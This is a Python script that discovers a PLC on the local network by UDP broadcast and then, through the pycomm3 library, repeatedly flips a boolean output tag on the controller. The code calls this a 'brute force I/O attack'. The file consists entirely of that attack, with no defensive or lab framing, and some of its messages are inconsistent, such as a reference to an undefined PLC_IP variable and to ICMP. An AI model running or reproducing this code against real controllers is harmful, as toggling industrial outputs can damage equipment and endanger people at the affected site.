import pycomm3
import time
import socket

# Configuration
PLC_PROGRAM_NAME = "Prog1"  # Assuming the structured text block is in a program named Prog1
TARGET_TAG = PLC_PROGRAM_NAME + ".Tog_Off"  # Full tag path in PLC
BRUTE_FORCE_DELAY = 0.1  # Delay between I/O toggles (seconds)
BRUTE_FORCE_ITERATIONS = 20  # Number of toggle iterations

def find_plc_ip():
    """
    Attempts to discover the PLC's IP address.  This is a simplified approach
    and may not work in all network configurations.  It relies on the PLC responding
    to a broadcast message.

    Returns:
        str: The PLC's IP address if found, None otherwise.
    """
    try:
        # Create a UDP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        sock.settimeout(5)  # Timeout after 5 seconds

        # Broadcast a message that the PLC might respond to.  This is not a standard protocol,
        # so it may need to be adjusted based on your specific PLC configuration and network.
        message = b'who is there?'  # A very basic broadcast request
        sock.sendto(message, ('<broadcast>', 2222))  # Port 2222 is a common one to try

        # Listen for a response
        data, addr = sock.recvfrom(1024)  # Buffer size of 1024
        print(f"Received {len(data)} bytes from {addr}")
        sock.close()
        return addr[0]  # Return the IP address
    except socket.timeout:
        print("No response received from PLC after broadcast.")
        return None
    except Exception as e:
        print(f"Error during IP discovery: {e}")
        return None

def brute_force_io(plc_ip, tag, delay, iterations):
    """
    Performs a brute force I/O attack by repeatedly toggling a boolean tag.

    Args:
        plc_ip (str): The IP address of the PLC.
        tag (str): The full tag name of the I/O point to toggle.
        delay (float): Delay in seconds between toggles.
        iterations (int): The number of toggle iterations.
    """
    try:
        with pycomm3.LogixDriver(plc_ip) as plc:
            print(f"Successfully connected to PLC at {plc_ip}")

            for i in range(iterations):
                # Read the current value
                read_response = plc.read(tag)
                if read_response.status != 'ok':
                    print(f"Error reading tag {tag}: {read_response.status}")
                    break
                current_value = read_response.value

                # Toggle the value (invert the current value)
                new_value = not current_value

                # Write the new value
                write_response = plc.write(tag, new_value)
                if write_response.status != 'ok':
                    print(f"Error writing to tag {tag}: {write_response.status}")
                    break

                print(f"Iteration {i+1}: Tag {tag} toggled to {new_value}")
                time.sleep(delay)

            print("Brute force I/O attack complete.")

    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    # 1. Discover PLC IP address
    plc_ip_address = find_plc_ip()
    if not plc_ip_address:
        print("Failed to discover PLC IP address.  Please manually configure the PLC_IP variable.")
        print("The script requires the PLC to be on the same network, and configured to allow ICMP responses")
        exit()

    print(f"Discovered PLC IP Address: {plc_ip_address}")

    # 2. Execute Brute Force Attack
    brute_force_io(plc_ip_address, TARGET_TAG, BRUTE_FORCE_DELAY, BRUTE_FORCE_ITERATIONS)